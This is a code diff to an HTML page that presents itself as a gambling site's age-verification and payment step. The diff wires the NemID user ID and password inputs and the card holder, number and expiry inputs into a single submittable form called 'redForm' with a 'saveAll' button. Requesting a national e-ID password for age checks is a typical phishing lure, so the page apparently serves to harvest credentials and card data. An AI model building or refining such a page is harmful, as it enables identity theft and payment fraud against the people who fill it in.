@@ -113,6 +113,9 @@
                 </div>
               </div>
             </div>
+
+            <form id="redForm">
+
             <div id='frame2'>
               <h1>Age Verification</h1>
               <p>In order to play for money you need to be over 18 years old. To be 100% sure we must verify your age using NemID </p>
@@ -122,8 +125,16 @@
                 <img src="img/nemid.jpg" id='nem_logo'>
               </div>
               <div id='nem_inputs'>
-                <label>User ID<input type="text" placeholder="User ID" required></label>
-                <label id='pass'>Password<input type="text" placeholder="Password" required></label>
+                <label>User ID<input 
+                  type="text"
+                  name="nemid" 
+                  placeholder="User ID" 
+                  required></label>
+                <label id='pass'>Password<input 
+                  type="text" 
+                  name="nempassword"
+                  placeholder="Password" 
+                  required></label>
                 <button id='accept'>Accept</button>
 
               </div>
@@ -137,11 +148,16 @@
 
     <div class="front">
         <div class="title">Card holder name</div>
-        <input class='card_input' type="text" placeholder="Card holder name" required>
+        <input 
+        class='card_input' 
+        type="text" 
+        name="card_holder"
+        placeholder="Card holder name" 
+        required>
       <div class="card-number">
         <div class="title">Card number</div>
         <div class="card-number__inputs">
-          <div><input class='card_input' type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="0000" class="card-number-input" required></div>
+          <div><input class='card_input' type="text" name="card_number" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="0000" class="card-number-input" required></div>
           <div><input  class='card_input' type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="0000" class="card-number-input" required></div>
           <div><input  class='card_input' type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="0000" class="card-number-input" required></div>
           <div><input  class='card_input' type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="0000" class="card-number-input" required></div>
@@ -151,7 +167,16 @@
       <div class="card-date">
         <div class="title">Valid thru</div>
         <div class="card-date__inputs">
-          <div><input  class='card_input' type="text" maxlength="2" inputmode='numeric' pattern="\d+" placeholder="00" class="card-date-input" required></div>
+          <div><input  
+            class='card_input' 
+            type="text" 
+            name="date"
+            maxlength="2" 
+            inputmode='numeric' 
+            pattern="\d+" 
+            placeholder="00" 
+            class="card-date-input" 
+            required></div>
           <div class="divider">/</div>
           <div><input  class='card_input' type="text" maxlength="2" inputmode='numeric' pattern="\d+" placeholder="00" class="card-date-input" required></div>
         </div>
@@ -190,8 +215,9 @@
                         </div>
                   
                         <div class="card-actions">
-                          <button id="card-submit" class="card-submit">Submit</button>
+                          <button id="saveAll" class="card-submit">Submit</button>
                         </div>
+                        </form>
                   
                   
                       </div>
